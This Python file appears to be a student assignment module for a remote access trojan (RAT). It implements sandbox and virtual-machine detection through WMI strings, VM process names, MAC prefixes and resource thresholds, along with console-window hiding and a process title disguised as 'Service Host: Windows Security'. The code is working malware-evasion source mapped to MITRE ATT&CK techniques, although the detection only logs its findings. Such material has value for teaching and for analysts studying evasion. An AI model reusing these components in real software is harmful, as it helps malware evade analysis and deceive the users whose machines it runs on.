"""
Evasion Module - VM Detection, Console Hiding, Process Masquerading
MITRE ATT&CK: T1497.001 (Virtualization/Sandbox Evasion: System Checks)
                T1564.003 (Hide Artifacts: Hidden Window)
                T1036     (Masquerading)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Detects if running inside a virtual machine (VirtualBox, VMware, etc.)
and applies basic stealth techniques. Educational — logs indicators
but does NOT block execution.
"""

import os
import subprocess
import ctypes
import psutil


def detect_virtual_environment():
    """
    Check multiple indicators to detect if running inside a VM.
    Returns a list of VM indicators found (empty = likely bare metal).

    Checks:
    1. WMI model string (VirtualBox, VMware, QEMU, Xen, Hyper-V)
    2. VM-specific processes (VBoxService.exe, vmtoolsd.exe, etc.)
    3. MAC OUI prefixes (vendor-specific first 3 bytes)
    4. Disk size < 60GB (VMs often have small disks)
    5. RAM < 4GB AND CPU < 2 (resource-constrained sandbox)
    """
    indicators = []

    # 1. WMI model string check
    try:
        result = subprocess.run(
            ["wmic", "computersystem", "get", "model"],
            capture_output=True, text=True, timeout=10
        )
        model = result.stdout.lower()
        vm_strings = ["virtualbox", "vmware", "qemu", "xen", "hyper-v", "virtual machine",
                       "kvm", "parallels", "bochs"]
        for vm in vm_strings:
            if vm in model:
                indicators.append(f"WMI model contains '{vm}'")
    except Exception:
        pass

    # 2. VM-specific processes
    vm_processes = [
        "vboxservice.exe", "vboxtray.exe",       # VirtualBox
        "vmtoolsd.exe", "vmwaretray.exe",         # VMware
        "qemu-ga.exe",                             # QEMU
        "xenservice.exe",                          # Xen
        "vmmemctl",                                # VMware balloon driver
    ]
    try:
        for proc in psutil.process_iter(["name"]):
            try:
                pname = (proc.info["name"] or "").lower()
                if pname in vm_processes:
                    indicators.append(f"VM process running: {pname}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except Exception:
        pass

    # 3. MAC OUI prefix check
    vm_mac_prefixes = [
        "08:00:27",  # VirtualBox
        "00:0c:29",  # VMware
        "00:50:56",  # VMware
        "00:1c:42",  # Parallels
        "00:16:3e",  # Xen
        "52:54:00",  # QEMU/KVM
    ]
    try:
        import uuid
        mac = ':'.join(('%012x' % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
        mac_prefix = mac[:8].lower()
        for prefix in vm_mac_prefixes:
            if mac_prefix == prefix:
                indicators.append(f"MAC OUI matches VM vendor: {prefix}")
    except Exception:
        pass

    # 4. Disk size check (< 60GB suggests VM)
    try:
        disk = psutil.disk_usage("/")
        disk_gb = disk.total / (1024 ** 3)
        if disk_gb < 60:
            indicators.append(f"Small disk: {disk_gb:.1f} GB (< 60 GB)")
    except Exception:
        pass

    # 5. Low resources check (RAM < 4GB AND CPU < 2)
    try:
        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        cpu_count = psutil.cpu_count()
        if ram_gb < 4 and cpu_count < 2:
            indicators.append(f"Low resources: {ram_gb:.1f} GB RAM, {cpu_count} CPUs")
    except Exception:
        pass

    return indicators


def hide_console():
    """
    Hide the console window (T1564.003).
    Uses Windows API to make the console invisible.
    Only effective on Windows with a console window.
    """
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
            return True
    except Exception:
        pass
    return False


def masquerade_process():
    """
    Set console title to mimic a legitimate Windows process (T1036).
    Makes the RAT look like a Windows Security service in task manager.
    """
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Service Host: Windows Security")
        return True
    except Exception:
        pass
    return False


if __name__ == "__main__":
    print("=" * 50)
    print("  VM/Sandbox Detection Test")
    print("=" * 50)

    indicators = detect_virtual_environment()
    if indicators:
        print(f"\n[!] VM/Sandbox DETECTED - {len(indicators)} indicator(s):")
        for ind in indicators:
            print(f"    - {ind}")
    else:
        print("\n[+] No VM indicators found - likely bare metal")

    print(f"\n[*] Masquerade test: {masquerade_process()}")
    print("[*] Console hide test: SKIPPED (would hide this window)")
